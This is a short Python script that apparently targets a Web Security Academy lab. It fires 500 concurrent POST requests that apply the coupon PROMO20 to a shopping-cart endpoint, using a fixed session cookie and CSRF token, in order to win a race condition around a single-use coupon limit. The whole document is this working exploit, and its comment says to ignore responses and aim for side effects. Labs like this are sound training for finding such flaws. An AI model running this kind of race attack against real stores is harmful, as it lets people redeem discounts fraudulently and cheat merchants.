import asyncio
import aiohttp

async def blast(session, url, headers, data):
    for _ in range(50):  # Adjust concurrency
        async with session.post(url, headers=headers, data=data) as resp:
            # Ignore responses; focus on side effects
            pass

async def main():
    url = "https://0acb004103b9c15780113f4c002700e2.web-security-academy.net/cart/coupon"
    headers = {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "session=uR3lvHWc24dvFo7yEt8sK4yYDn6zQuMu"}
    data = "csrf=fRxBIVld9IEdpCmSIwejrlZYQxq6MRlW&coupon=PROMO20"
    
    async with aiohttp.ClientSession() as session:
        tasks = [blast(session, url, headers, data) for _ in range(10)]
        await asyncio.gather(*tasks)

asyncio.run(main())
